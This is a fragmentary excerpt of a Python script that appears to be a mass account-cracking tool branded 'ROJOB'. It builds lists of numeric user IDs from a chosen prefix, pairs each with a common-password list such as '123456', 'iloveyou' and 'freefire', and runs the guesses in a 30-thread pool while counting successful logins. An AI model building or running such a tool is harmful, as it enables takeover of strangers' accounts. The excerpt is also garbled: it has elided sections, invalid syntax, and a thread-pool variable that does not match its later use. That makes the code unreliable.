  ...
  #  print("To stop process press CTRL c")
    ...
    def rana(user):
        ...
        #        print('\r{}\033[1;94m[2F-KING] {} {} {} {}'.format(G, url, fax, px, mys))
                ...
                #print(response.text)
                continue
        sys.stdout.write('\r {} [ROJOB] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
...
def pak():
   ...
   #             os.system('python ROJOB GAMING.py')
def bd():
                user=[]
                clear()
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as ROJOB GAMING:     
                        clear()
                        tl = str(len(user))
                        print(' [-] Cracking Limit   : \033[1;32m'+tl)
                        print(f'\033[1;37m [-] Choice code ..:\033[1;32m '+code)
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','123456','1234567','12345678','123456789','1234567890','012345678','112233','11223344','freefire','freefirelover','pubglover','i love pubg','gamingboy','free fire','freefire']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
               # l1()
                print(' The process has completed')
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ ROJOB ] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
